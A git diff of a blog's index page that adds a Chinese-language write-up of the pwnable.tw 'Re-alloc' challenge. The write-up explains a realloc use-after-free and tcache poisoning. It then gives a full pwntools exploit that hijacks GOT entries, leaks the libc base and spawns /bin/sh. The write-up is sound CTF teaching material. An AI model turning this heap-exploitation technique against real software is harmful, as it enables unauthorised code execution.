@@ -166,6 +166,150 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/f6c454d44380.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ava1.jpg">
+      <meta itemprop="name" content="Cameudis">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cameudis' Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/Tech/Pwn/f6c454d44380.html" class="post-title-link" itemprop="url">【Pwn#0x10】pwnable.tw Re-alloc writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-04-13 23:03:41" itemprop="dateCreated datePublished" datetime="2023-04-13T23:03:41+08:00">2023-04-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/Tech/Pwn/f6c454d44380.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x10】pwnable.tw Re-alloc writeup" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/Tech/Pwn/f6c454d44380.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/f6c454d44380.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>相关：realloc、tcache2.29</p>
+<p>借用了很多巧合，实在是特别“幸运”的一个利用。<br>自己做出来之后，发现网上大部分wp都和我的解法不一样，但是更通用一些，不像我的那么极限（草）。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>保护情况：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<p>程序是一个菜单，提供了alloc、realloc、free功能，来操作bss段的两个栏位，大致功能如下：</p>
+<ul>
+<li>alloc：选中栏当前为NULL时，使用 realloc(NULL, size) 分配新的区块并读入数据；</li>
+<li>realloc：选中栏当前非NULL时，将选中栏使用 realloc(ptr, size) 来调整大小并（如果realloc返回值非0）读入数据；</li>
+<li>free：将选中栏使用 realloc(ptr, 0) 进行释放，并<strong>将指针置零</strong>。</li>
+</ul>
+<p>主要的漏洞在于realloc的使用上，可以通过RTFM（在线man地址：<a target="_blank" rel="noopener" href="https://linux.die.net/man/3/realloc">realloc(3): allocate&#x2F;free dynamic memory - Linux man page</a>）得到realloc的说明：</p>
+<blockquote>
+<p>The <strong>realloc</strong>() function changes the size of the memory block pointed to by <em>ptr</em> to <em>size</em> bytes. The contents will be unchanged in the range from the start of the region up to the minimum of the old and new sizes. If the new size is larger than the old size, the added memory will <em>not</em> be initialized. If <em>ptr</em> is NULL, then the call is equivalent to <em>malloc(size)</em>, for all values of <em>size</em>; if <em>size</em> is equal to zero, and <em>ptr</em> is not NULL, then the call is equivalent to <em>free(ptr)</em>. Unless <em>ptr</em> is NULL, it must have been returned by an earlier call to <strong>malloc</strong>(), <strong>calloc</strong>() or <strong>realloc</strong>(). If the area pointed to was moved, a <em>free(ptr)</em> is done.</p>
+</blockquote>
+<p>注意到，当ptr字段为0，realloc等价于malloc；当ptr不为0但size为0时，realloc等价于free。</p>
+<p>程序确实使用这两种功能来实现了malloc以及free，但是在realloc和free功能中，检查做得不够完善：</p>
+<ul>
+<li>当realloc中输入size为0，可以<strong>触发free，且不将原指针置零</strong>，创造了UAF的可能。</li>
+<li>使用free作用于空栏位（NULL），可以触发一次匿名的malloc(0)。这里的匿名指的是结果不会保存在bss段结构中，因为free会将其置零。</li>
+</ul>
+<p>其实另外还在alloc功能中发现了一个Off-by-NULL漏洞，但我并没有想到很好的办法来用到这个漏洞。</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>在宏观的层面上，由于程序二进制本身虽然关闭了PIE，但没有特别有用的函数，因此思路还是两步走：泄露libc地址、劫持控制流。</p>
+<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><p>程序本身并没有能够提供打印区块数据的功能，因此想要泄露libc数据就一定需要劫持控制流。<br>目前，栈地址未知排除ROP，将目标瞄准GOT：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">off_404018 dq offset _exit  </span><br><span class="line">off_404020 dq offset __read_chk</span><br><span class="line">off_404028 dq offset puts</span><br><span class="line">off_404030 dq offset __stack_chk_fail</span><br><span class="line">off_404038 dq offset printf</span><br><span class="line">off_404040 dq offset alarm</span><br><span class="line">off_404048 dq offset atoll</span><br><span class="line">off_404050 dq offset signal</span><br><span class="line">off_404058 dq offset realloc</span><br><span class="line">off_404060 dq offset setvbuf</span><br><span class="line">off_404068 dq offset __isoc99_scanf</span><br></pre></td></tr></table></figure>
+
+<p>首先思考可不可以把唯一操作区块的外部函数——realloc替换为puts来泄露地址，笔者这时顾忌到题目限制了区块大小，不太方便构造 unsorted bin 中的区块。<br>因此将目标瞄准了atoll，这个函数在read_long中被调用，参数是栈上用来读入数字的buffer。可以尝试用它来泄露栈上的数据。</p>
+<p>这时一个好主意是使用plt[printf]代替atoll，这样就可以在栈上指哪打哪，可惜笔者做的时候并没有想到这个好主意，只是用了plt[puts]。不过不影响，因为我遇到了第一个逆天的巧合：<strong>在buffer+8的位置就有一个libc地址</strong>。先介绍一下怎么覆写的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">realloc_free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, pack(elf.got[<span class="string">&quot;atoll&quot;</span>]))</span><br><span class="line">free(<span class="number">1</span>)     <span class="comment"># alloc a anonymous 0x20 chunk</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x18</span>, pack(elf.plt[<span class="string">&quot;puts&quot;</span>])+pack(<span class="number">0</span>)+pack(<span class="number">0x4015DC</span>))</span><br></pre></td></tr></table></figure>
+
+<p>第一行创建了一个0x20大小区块，第二行将其释放进入tcache，同时保留了这个指针。<br>第三行使用了realloc，realloc发现这个区块大小正常就直接放行了，从而我们可以覆盖fd指针为got[atoll]。<br>第四行使用free的漏洞来申请一个匿名区块，分配完之后再下一个区块就是atoll了。<br>第五行将atoll覆盖为plt[puts]，并顺便把realloc覆盖为一个普通 <code>ret</code> 的地址，原因后面再说。</p>
+<p><em>这里需要提一嘴，我使用了匿名区块来解决这一问题：非0的栏位无法进行alloc。不过在复盘时，从网上的大佬那边发现可以通过一种非常巧妙的方式来将栏位置零，同时又不干扰已经位于tcache中的atoll地址，从而将后续利用流程也变得直观一些。<br>可以通过realloc将区块变大，然后再free。这样就可以free到别的大小的tcache中，并且根本不用关注key的检查，也不会将atoll的地址覆盖，一举两得。<br>参考地址见<a target="_blank" rel="noopener" href="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/">Binary Exploitation [pwnable.tw] - Realloc - Tainted Bits</a></em></p>
+<p>接下来泄露libc地址，由于buffer+8就有，因此简简单单就可以泄露了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1111111\n&quot;</span>)   <span class="comment"># just padding</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;1111111\n&quot;</span>)</span><br><span class="line">libc_base = unpack(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x1e570a</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击！"><a href="#攻击！" class="headerlink" title="攻击！"></a>攻击！</h3><p>目标是 get shell，由于之前已经有了指向GOT的指针（栏位1中），所以我们想办法利用realloc中最后的那个read_input函数来再次修改GOT。<br>但由于realloc在中间会调用realloc（废话），直接让他realloc一个GOT中的区块大概率是要出问题的，而且程序会往realloc的返回值中读入数据。因此我们需要想一个办法让realloc调用返回之后，rax是GOT中区块的地址。</p>
+<p>静态分析一波，并没有发现什么 <code>mov rax, rdi; ret;</code> 的gadget，难道我的方法走不下去了吗？于是动态分析一波，惊喜地发现 <strong>程序在调用realloc之前，rax中就已经是GOT中区块地地址了</strong>，令人不得不感叹 <del>大自然</del> 出题人的鬼斧神工。</p>
+<p>所以就有了上面把realloc覆盖为一个简单的 <code>ret</code> 。这样一来，在执行了下面几句代码后，atoll就会变成system的地址（<strong>注意注释</strong>，很重要）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;\0&#x27;</span>)          <span class="comment"># now atoll is puts, so puts(&quot;\0&quot;) = 1</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1111111\0&quot;</span>)   <span class="comment"># now atoll is puts, so puts(&quot;1111111\0&quot;) = 8</span></span><br><span class="line"><span class="comment"># we have hijacked realloc to &#x27;ret&#x27;, and when call realloc, rax has been same as rdi (which is really coincident)</span></span><br><span class="line"><span class="comment"># so program just pass and execute read_input(heap[v1], size)</span></span><br><span class="line">io.sendline(pack(libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br></pre></td></tr></table></figure>
+
+<p>最后，我们随便触发一个read_long，输入&#x2F;bin&#x2F;sh，就可以成功 get shell！当然，也可以直接输入 <code>cat ~/flag</code>，如果您需要节省时间的话。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params"><span class="built_in">id</span>, size, data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc</span>(<span class="params"><span class="built_in">id</span>, size, data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc_free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- leak libc ----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.1 hijack GOT[atoll] to PLT[puts], GOT[realloc] to &#x27;ret&#x27;</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">    realloc_free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x18</span>, pack(elf.got[<span class="string">&quot;atoll&quot;</span>]))</span><br><span class="line">    free(<span class="number">1</span>)     <span class="comment"># alloc a anonymous 0x20 chunk</span></span><br><span class="line">    alloc(<span class="number">1</span>, <span class="number">0x18</span>, pack(elf.plt[<span class="string">&quot;puts&quot;</span>])+pack(<span class="number">0</span>)+pack(<span class="number">0x4015DC</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.2 leak libc load address (from stack)</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1111111\n&quot;</span>)   <span class="comment"># just padding</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;1111111\n&quot;</span>)</span><br><span class="line">    libc_base = unpack(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x1e570a</span></span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- hijack GOT ----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.1 hijack GOT[atoi] to libc[system]</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;\0&#x27;</span>)          <span class="comment"># now atoll is puts, so puts(&quot;\0&quot;) = 1</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1111111\0&quot;</span>)   <span class="comment"># now atoll is puts, so puts(&quot;1111111\0&quot;) = 8</span></span><br><span class="line">    <span class="comment"># we have hijacked realloc to &#x27;ret&#x27;, and when call realloc, rax has been same as rdi (which is really coincident)</span></span><br><span class="line">    <span class="comment"># so program just pass and execute read_input(heap[v1], size)</span></span><br><span class="line">    io.sendline(pack(libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.2 trigger system(&quot;/bin/sh&quot;) by atoi(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    success(<span class="string">&quot;Enjoy your shell!&quot;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>这个故事告诉我们：涉及内存安全的函数还是要小心小心再小心，仔细阅读手册、了解边界行为……</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PoRE/d5088fb7cb3c.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1243,113 +1387,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PoRE/5acc028df792.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ava1.jpg">
-      <meta itemprop="name" content="Cameudis">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Cameudis' Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/Tech/PoRE/5acc028df792.html" class="post-title-link" itemprop="url">【PoRE#0x00】欢迎来到逆向工程原理</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-03 16:43:28" itemprop="dateCreated datePublished" datetime="2023-03-03T16:43:28+08:00">2023-03-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-01-11 16:34:30" itemprop="dateModified" datetime="2024-01-11T16:34:30+08:00">2024-01-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Tech/PoRE/" itemprop="url" rel="index"><span itemprop="name">PoRE</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/Tech/PoRE/5acc028df792.html" class="post-meta-item leancloud_visitors" data-flag-title="【PoRE#0x00】欢迎来到逆向工程原理" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/Tech/PoRE/5acc028df792.html#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PoRE/5acc028df792.html" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>为了在学校的高强度课程《逆向工程原理 Principles of Reverse Engineer》存活下来，站主决定开启一个系列笔记，并同步到博客上。<br>目标是将课程以及实验的要点以人话讲清楚，整理一些便于查询的cheatsheet，并尝试拓展学习一些有趣的内容，以便同学和自己参考。（如果有同学看的话(´_ゝ&#96;)）</p>
-<p>本期作为第0期，主要记录课程的基础设施使用方法。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/Tech/PoRE/5acc028df792.html#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1421,7 +1458,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-count">67</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
